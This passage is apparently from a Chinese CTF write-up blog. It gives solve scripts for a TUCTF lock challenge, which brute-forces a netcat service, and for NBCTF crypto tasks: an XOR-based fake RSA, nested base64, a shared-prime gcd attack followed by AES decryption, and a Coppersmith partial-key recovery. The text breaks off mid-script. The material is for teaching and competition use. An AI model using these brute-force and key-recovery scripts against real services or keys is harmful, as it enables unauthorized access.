class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  ___________</span><br><span class="line"> /           \</span><br><span class="line">/__|0|0|0|0|__\</span><br><span class="line">|      @      |</span><br><span class="line">|_____________|</span><br></pre></td></tr></table></figure><p>“This here lock be cursed by the shaman of the swamp to change keys for each attempt”   <code>nc chal.tuctf.com 30002</code></p><h3 id="考点：连接服务器暴力破解">考点：连接服务器暴力破解</h3><h3 id="解题：">解题：</h3><p>3位密码锁 从000到999全部尝试一遍暴力破解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():  </span><br><span class="line">    <span class="comment"># 创建socket对象  </span></span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 连接到服务器  想当于使用了nc指令</span></span><br><span class="line">    server_address = (<span class="string">&#x27;chal.tuctf.com&#x27;</span>, <span class="number">30002</span>)  <span class="comment"># 服务器IP地址和端口号  </span></span><br><span class="line">    client_socket.connect(server_address)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="comment"># 发送选择旋转锁的命令  </span></span><br><span class="line">        client_socket.sendall(<span class="string">b&#x27;1\n&#x27;</span>)  </span><br><span class="line">        <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">        response = client_socket.recv(<span class="number">1024</span>)  <span class="comment"># 接收的最大字节数  </span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode())  </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 发送选择旋转轮子的命令  </span></span><br><span class="line">        client_socket.sendall(<span class="string">b&#x27;1\n&#x27;</span>)  </span><br><span class="line">        <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">        response = client_socket.recv(<span class="number">1024</span>)  <span class="comment"># 接收的最大字节数  </span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;The chest is still locked!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.decode():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode())  </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># 发送选择旋转方向的命令  </span></span><br><span class="line">        client_socket.sendall(<span class="string">b&#x27;+\n&#x27;</span>)  <span class="comment"># 假设选择顺时针方向  </span></span><br><span class="line">        <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;The chest is still locked!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.decode():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode())   </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="comment"># 发送选择旋转锁的命令  </span></span><br><span class="line">            client_socket.sendall(<span class="string">b&#x27;1\n&#x27;</span>)  </span><br><span class="line">            <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">            response = client_socket.recv(<span class="number">1024</span>)  <span class="comment"># 接收的最大字节数  </span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode())  </span><br><span class="line">    </span><br><span class="line">            <span class="comment"># 发送选择旋转轮子的命令  </span></span><br><span class="line">            client_socket.sendall(<span class="string">b&#x27;2\n&#x27;</span>)  </span><br><span class="line">            <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">            response = client_socket.recv(<span class="number">1024</span>)  <span class="comment"># 接收的最大字节数  </span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode())  </span><br><span class="line">            <span class="comment"># 发送选择旋转方向的命令  </span></span><br><span class="line">            client_socket.sendall(<span class="string">b&#x27;+\n&#x27;</span>)  <span class="comment"># 假设选择顺时针方向  </span></span><br><span class="line">            <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">            response = client_socket.recv(<span class="number">1024</span>)  <span class="comment"># 接收的最大字节数  </span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode()) </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">                <span class="comment"># 发送选择旋转锁的命令  </span></span><br><span class="line">                client_socket.sendall(<span class="string">b&#x27;1\n&#x27;</span>)  </span><br><span class="line">                <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">                response = client_socket.recv(<span class="number">1024</span>)  <span class="comment"># 接收的最大字节数  </span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode())  </span><br><span class="line">        </span><br><span class="line">                <span class="comment"># 发送选择旋转轮子的命令  </span></span><br><span class="line">                client_socket.sendall(<span class="string">b&#x27;3\n&#x27;</span>)  </span><br><span class="line">                <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">                response = client_socket.recv(<span class="number">1024</span>)  <span class="comment"># 接收的最大字节数  </span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode())  </span><br><span class="line">                <span class="comment"># 发送选择旋转方向的命令  </span></span><br><span class="line">                client_socket.sendall(<span class="string">b&#x27;+\n&#x27;</span>)  <span class="comment"># 假设选择顺时针方向  </span></span><br><span class="line">                <span class="comment"># time.sleep(2)  # 等待服务器响应  </span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;The chest is still locked!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.decode():</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;服务器响应: &quot;</span>, response.decode())  </span><br><span class="line">    <span class="comment"># 关闭连接  </span></span><br><span class="line">    client_socket.close()  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>该脚本从000进行遍历，可能耗时会长一点，但是只要抛出结果，脚本就会自动结束</p><h1 id="nbctf">NBCTF</h1><p>网址：<a href="https://nbctf.com/challs">https://nbctf.com/challs</a></p><h2 id="crypto-rivest-shamir-forgot-adleman-solved">crypto/Rivest Shamir forgot Adleman | SOLVED</h2><h3 id="题面：">题面：</h3><p>Exponents took too long. I decided to use an alternative. It won’t about the same right? <a href="https://en.wikipedia.org/wiki/RSA*(cryptosystem)*">https://en.wikipedia.org/wiki/RSA*(cryptosystem)*</a></p><h3 id="考点：异或">考点：异或</h3><h3 id="题目：">题目：</h3><p><a href="http://chall.py">chall.py</a>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">123589168751396275896312856328164328381265978316578963271231567137825613822284638216416</span></span><br><span class="line">m = bytes_to_long(<span class="string">b&quot;nbctf&#123;[REDACTED]&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ct = (m^e) % n</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e = &quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ct = &quot;</span>, ct)</span><br></pre></td></tr></table></figure><p>out.txt:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n =  13431294979312769345517878088407659222785929563176888493659632690735510803353339825485161776891929296355466082338185199541755546384591261208929371208286410559187299345800125302598147388467283782373829399059130130575707550536466670447022349923395822077916588516101640779751198703879200863153859677174339078186779847910915309774616338231020176817201080756103027200290903849975398368943087868140010448011002364291104062990443568049879169811274854879262048473842331319786127894828031613201122015559660817797429013884663990368453887433480357502012963127000535358820517096295714967262963843868885674823702064175405493435873</span><br><span class="line">e =  123589168751396275896312856328164328381265978316578963271231567137825613822284638216416</span><br><span class="line">ct =  159269674251793083518243077048685663852794473778188330996147339166703385101217832722333</span><br></pre></td></tr></table></figure><h3 id="解题：">解题：</h3><p>在模n域中进行异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = getPrime(1024)</span></span><br><span class="line"><span class="comment"># q = getPrime(1024)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># n = p*q</span></span><br><span class="line">e = <span class="number">123589168751396275896312856328164328381265978316578963271231567137825613822284638216416</span></span><br><span class="line"><span class="comment"># m = bytes_to_long(b&quot;nbctf&#123;[REDACTED]&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ct = (m^e) % n</span></span><br><span class="line">n =  <span class="number">13431294979312769345517878088407659222785929563176888493659632690735510803353339825485161776891929296355466082338185199541755546384591261208929371208286410559187299345800125302598147388467283782373829399059130130575707550536466670447022349923395822077916588516101640779751198703879200863153859677174339078186779847910915309774616338231020176817201080756103027200290903849975398368943087868140010448011002364291104062990443568049879169811274854879262048473842331319786127894828031613201122015559660817797429013884663990368453887433480357502012963127000535358820517096295714967262963843868885674823702064175405493435873</span></span><br><span class="line">e =  <span class="number">123589168751396275896312856328164328381265978316578963271231567137825613822284638216416</span></span><br><span class="line">ct =  <span class="number">159269674251793083518243077048685663852794473778188330996147339166703385101217832722333</span></span><br><span class="line">re = (ct^e) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(re))</span><br></pre></td></tr></table></figure><h2 id="crypto-32-32-64-solved">crypto/32+32=64 | SOLVED</h2><h3 id="题面：">题面：</h3><p>64 is too much, but 32 isn’t. 32+32=64?</p><h3 id="考点：base64">考点：base64</h3><h3 id="题目：">题目：</h3><p>32_1.txt</p><p>32_2.txt</p><p>两个文件都达到了一万多行 就不贴了</p><h3 id="解题：">解题：</h3><p>这么多数据 就是因为不断使用了base64进行循环加密，所以不断进行base64解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;32_1.txt&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    flag = base64.b64decode(flag)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;nbctf&#123;h0pE_&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;32_2.txt&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    flag = base64.b64decode(flag)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;y0U_h4d_fUn&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="crypto-sbg-abw-s-insanity-solved">crypto/SBG-ABW’s Insanity | SOLVED</h2><h3 id="题面：">题面：</h3><p>“Skill Issue” - AnonymousBlueWhale</p><h3 id="题目：">题目：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long, isPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;we give you this as a gift!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1096</span>)</span><br><span class="line">q1 = getPrime(<span class="number">1096</span>)</span><br><span class="line">q2 = getPrime(<span class="number">1096</span>)</span><br><span class="line">n1 = p*q1</span><br><span class="line">n2 = p*q2</span><br><span class="line"></span><br><span class="line">e = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">ct1 = <span class="built_in">pow</span>(m,e,n1)</span><br><span class="line">ct2 = <span class="built_in">pow</span>(m,e,n2)</span><br><span class="line"></span><br><span class="line">key = hashlib.sha256(long_to_bytes(q1)).digest()</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">enc_flag = cipher.encrypt(pad(<span class="string">b&quot;nbctf&#123;[REDACTED]&#125;&quot;</span>, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ct1 =&quot;</span>, ct1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ct2 =&quot;</span>, ct2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;enc_flag =&quot;</span>, enc_flag.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><h3 id="考点：gcd-整数分解-aes-ecb">考点：gcd 整数分解 AES ECB</h3><h3 id="解题：">解题：</h3><p>对题目进行分析，因为AES.ECB是直接根据密钥进行逆向解密的</p><p>所以我们的目的就是获得q1</p><p>所以观察q1的生成方式，看看在哪里出现了q1，准确定位到对应代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n1 = p*q1</span><br><span class="line">n2 = p*q2</span><br><span class="line"></span><br><span class="line">e = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">ct1 = <span class="built_in">pow</span>(m,e,n1)</span><br><span class="line">ct2 = <span class="built_in">pow</span>(m,e,n2)</span><br></pre></td></tr></table></figure><p>其中ct1和ct2、m、e均已知，下面进行数学推导</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ct1 = m^e + k1 * n1 = m^e + k1 * p * q1</span><br><span class="line">ct2 = m^e + k2 * n2 = m^e + k2 * p * q2</span><br><span class="line">=&gt;</span><br><span class="line">k1 * p * q1 = ct1 - m^e</span><br><span class="line">k2 * p * q2 = ct2 - m^e</span><br><span class="line">=&gt; 然后我们发现对上面式子中求出来的两个数求gcd公约数即可获得p</span><br><span class="line">=&gt; 然后有p了之后对1式两边同时除p </span><br><span class="line">k1 * q1 = (ct1 - m^e) / p</span><br><span class="line">=&gt;最后一步是要获得q1 显然是有k1的干扰两个数相乘，所以借助一点工具 对这个数进行分解</span><br></pre></td></tr></table></figure><p>法1：本地跑yafu</p><p>法2：在线网站分解https://www.alpertron.com.ar/ECM.HTM</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long, isPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;we give you this as a gift!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = getPrime(1096)</span></span><br><span class="line"><span class="comment"># q1 = getPrime(1096)</span></span><br><span class="line"><span class="comment"># q2 = getPrime(1096)</span></span><br><span class="line"><span class="comment"># n1 = p*q1</span></span><br><span class="line"><span class="comment"># n2 = p*q2</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">11</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ct1 = pow(m,e,n1)</span></span><br><span class="line"><span class="comment"># ct2 = pow(m,e,n2)</span></span><br><span class="line"><span class="comment">#根据ct1和ct2 得到n1和n2</span></span><br><span class="line"></span><br><span class="line">ct1 = <span class="number">196150896308015382573408099004515975466540094705348761587854272630906023749083911008835478259767648401709605726136589590310666858430120235218762651641330953170392784645631801449432061363776229651965539255255795373230255852992805188205639228954217034390731460194284731845705855212209524525682241998203303747513174581513168217999505436596818091279091144718119512522929858750349220346765422769476003604849600128605208123474607256344535541843454810706150705449483256361736428064150792476736751093915251743882647862500622465233906844054109281842278362125589335774364236155483783338907105809549449368926475631824722919958889450225026843225780470131268709445293157749</span></span><br><span class="line">ct2 = <span class="number">83507921327913521142443934492559420944369023782917085618978768157512494136296269338031471193927727958060037960270530278173852027186606624474398269053920321522448607751539858355179998108075848593814112217098612017462222420001262248144471923306139580601814218471659969728514600258330312623506466116333593434744460773476488134792248490905628242447603788884700795677619881924772996081377617066055448888668800826281711315468059146518373888252421991592124071284411947405472003802863596010724784730366575751160333120162778945930063499020829492960600318519615351417595308518636794008603089224459556289944808655338805251676963828327517925911000528943113536807796285824</span></span><br><span class="line"></span><br><span class="line">tmp = <span class="built_in">pow</span>(m,e)</span><br><span class="line">flag1 = tmp - ct1 <span class="comment">#= k1 * n1 = k1 * p * q1</span></span><br><span class="line">flag2 = tmp - ct2 <span class="comment">#= k2 * n2 = k2 * p * q2</span></span><br><span class="line">p = gmpy2.gcd(flag1,flag2)</span><br><span class="line"><span class="built_in">print</span>(gmpy2.gcd(p,flag2))</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(flag1 // p)</span><br><span class="line">k1q1 = flag1 // p</span><br><span class="line"><span class="comment">#得到k1和q1分解</span></span><br><span class="line">q1 = <span class="number">603701201822386830907144477326706640694145605732107023753674808182665696931502012989218558077472289899849882120737934821898165435847435044518846871242860227586749788240998624721376490806164324545522115137075097300642534248374378375756928831273442124872283671893345317220496457140852434166575343690062190540448032738970711476061243</span></span><br><span class="line">key = hashlib.sha256(long_to_bytes(q1)).digest()</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="comment"># enc_flag = cipher.encrypt(pad(b&quot;nbctf&#123;[REDACTED]&#125;&quot;, 16))</span></span><br><span class="line"></span><br><span class="line">enc_flag = <span class="string">&#x27;ac2289b707b174c541cf0952bf3b2057561b0872451444a5bbecf18c007ea20fa2b7c8a1707a74a1657e5adb5c1a417f&#x27;</span></span><br><span class="line">enc_flag = <span class="built_in">bytes</span>.fromhex(enc_flag)</span><br><span class="line"><span class="comment"># print(cipher.decrypt(enc_flag))</span></span><br><span class="line"><span class="comment"># print(enc_flag)</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;nbctf&quot;</span> <span class="keyword">in</span> cipher.decrypt(enc_flag):</span><br><span class="line">    <span class="built_in">print</span>(cipher.decrypt(enc_flag))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;nbctf&#123;c0ngr4ts_0n_F1nish1n9_Th3_3_P4rt3r!!!!&#125;\x03\x03\x03&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="crypto-too-little-information-solved">crypto/Too Little Information | SOLVED</h2><h3 id="题面：">题面：</h3><p>My computer crashed generating my keys. :( Can you recover them for me?</p><h3 id="题目：">题目：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&quot;nbctf&#123;[REDACTED]&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">ct = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">hint = (p+q) &gt;&gt; <span class="number">200</span> <span class="comment"># I can&#x27;t be giving you that much!</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;hint = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">ct = <span class="number">20030315247290021934293927354887580426070566017560641204155610658927917290198737029903594702064351773446005018155094643288125396810753014936800515440652855824038470725838848349666236623899089094953181436465435270989651491997801177943499187812270081592263331832916362349716591828106306150603120693022149233534</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">90166344558664675592644684556355545187373291859609367810958775310181360193141550862577281658089332577942193823477148064165061303827534169112815736618901965700400798345371758370344207077280925015891945591352156370597957742921722432314582261224366498475465730899163137511778647694175484386010210005826793007961</span></span><br><span class="line">hint = <span class="number">12227137598952006551839416663729660224872609953685427677011433223002140448682395830146750981200</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="考点：移位-coppersmith">考点：移位 CopperSmith</h3><h3 id="解题：">解题：</h3><p>前置知识点：</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20231206153106063.png" alt="image-20231206153106063"></p><p>对移位这次一定要弄明白了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint &gt;&gt; <span class="number">200</span>   <span class="comment">#右移相当于缩小 </span></span><br></pre></td></tr></table></figure><blockquote><p>对于十进制来说：</p><p>做除运算 等价于hint // 2**200</p><p>对于二进制来说：</p><p>移位前0b10111011100100110101010000111011001111110110110110000001101011110000000101100100000100111001110101000011001001110  11000100101100011111011100110110000110011011100100011111110111110000111110000010100001001111001100001100110000111011011011001011111111101000010111101000011010011110001011111100111000111010010001010000</p><p>移位后0b10111011100100110101010000111011001111110110110110000001101011110000000101100100000100111001110101000011001001110</p><p>相当于直接截取掉低200位二进制数据</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint &lt;&lt; <span class="number">200</span>  <span class="comment">#左移相当于扩大</span></span><br></pre></td></tr></table></figure><blockquote><p>对于十进制来说：</p><p>做乘运算 等价于hint * 2**200</p><p>对于二进制来说：</p><p>移位前</p><p>0b1011101110010011010101000011101100111111011011011000000110101111000000010110010000010011100111010100001100100111011000100101100011111011100110110000110011011100100011111110111110000111110000010100001001111001100001100110000111011011011001011111111101000010111101000011010011110001011111100111000111010010001010000</p><p>移位后</p><p>0b在低200位填充0 相当于把原来位置的权值抬高了</p></blockquote><p>目前题目中给出的是</p><p><code>p+q &gt;&gt; 200</code></p><p>相当于p+q的低200位丢失了 需要恢复</p><p>在低位确实的运算中有这样一个特点：</p><p>n = p * q</p><p>n = p * (p + q - p)</p><p>得到关于p的一个方程</p><p>p*((p+q)-p) - n = 0</p><p>因为p+q是缺失低200位的</p><p>所以该方程解出的结果也是p也是部分数据 虽然结果也是512bit位的 但是存在部分数据丢失，具有相同的MBS(最高有效位)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p_ = var(<span class="string">&#x27;p_&#x27;</span>)</span><br><span class="line"><span class="comment">#当前hint的二进制位数为313 缺少200位</span></span><br><span class="line">approx_p_plus_q = hint &lt;&lt; <span class="number">200</span> <span class="comment">#反向移位补全数据 512</span></span><br><span class="line">approx_p = <span class="built_in">int</span>((p_*(approx_p_plus_q - p_) - n).roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(approx_p)  <span class="comment">#因为hint进行了填充 所以此时的p也是512位 具有相同最高有效位313 只不过低200位的数据不准确</span></span><br></pre></td></tr></table></figure><p>那么恢复丢失的数据 =&gt; CopperSmith</p><p>假设缺失的数据为x bit设置为200位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 